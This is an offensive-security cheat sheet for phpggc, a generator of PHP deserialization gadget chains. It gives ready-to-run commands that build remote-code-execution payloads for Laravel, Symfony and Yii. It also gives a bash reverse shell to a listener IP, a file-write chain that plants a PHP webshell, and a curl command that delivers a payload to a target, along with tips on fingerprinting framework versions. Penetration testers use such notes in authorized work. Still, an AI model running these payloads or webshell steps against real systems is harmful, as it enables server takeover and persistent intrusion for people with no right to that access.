# phpggc

**Tags:** #phpggc #Deserialization #PHP #RCE #GadgetChains #Payloads #WebAppAttacks

`phpggc` (PHP Generic Gadget Chains) is the PHP counterpart to ysoserial — a library of pre-built gadget chains for popular frameworks (Laravel, Symfony, Yii, Magento, WordPress, Guzzle, Monolog, Doctrine) that turn a reachable `unserialize()` call into file write, file read, SSRF, or RCE. You supply the framework and the command; it emits the serialized payload.

**Source:** https://github.com/ambionics/phpggc
**Install:** `git clone https://github.com/ambionics/phpggc` — pure PHP, no dependencies

```bash
# List every available chain, or filter to the target's framework
./phpggc -l
./phpggc -l | grep -i "laravel\|symfony\|yii\|magento\|wordpress"

# RCE payloads (-b base64-encodes for transport in a cookie/param)
./phpggc Laravel/RCE5 system 'id' -b
./phpggc Symfony/RCE1 system 'id' -b
./phpggc Yii/RCE1 system 'id' -b

# Reverse shell
./phpggc Laravel/RCE5 "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'" -b

# File-write chain — drop a webshell without needing a command sink
./phpggc Guzzle/FW1 /var/www/html/shell.php '<?php system($_GET["c"]);?>' -b

# Send it
PAYLOAD=$(./phpggc Laravel/RCE5 system 'id' -b)
curl -s "http://<TARGET>/vulnerable" -d "data=$PAYLOAD"
```

| Flag | Description |
|---|---|
| `-l [filter]` | List chains, optionally filtered |
| `-i <chain>` | Show chain details — required PHP/framework versions, side effects |
| `-b` | Base64-encode the payload |
| `-u` | URL-encode the payload |
| `-f` | Fast-destruct — trigger on `__destruct` immediately rather than at script end |
| `-a` | Include ASCII-strings-only workaround for filtered transports |

> [!tip] Run `./phpggc -i <chain>` before firing — chains are version-pinned, and the info page tells you which framework releases the gadget actually exists in. Fingerprint the framework version first (`/composer.lock`, error pages, `X-Powered-By`).

> [!note] Chain names encode the primitive: `RCE*` = code execution, `FW*` = file write, `FR*` = file read, `SQLI*` = SQL injection, `INFO*` = info leak. A file-write chain is often more reliable than RCE when the app disables `system()`.

> [!note] **See also** — [[Techniques/Deserialization|Deserialization]] — PHP gadget chain generation. Java equivalent is [[Tools/Payloads & Shells/ysoserial|ysoserial]]; .NET is [[Tools/Payloads & Shells/ysoserial.net|ysoserial.net]].

---

*Created: 2026-07-30*
*Updated: 2026-07-30*
*Model: claude-opus-5*
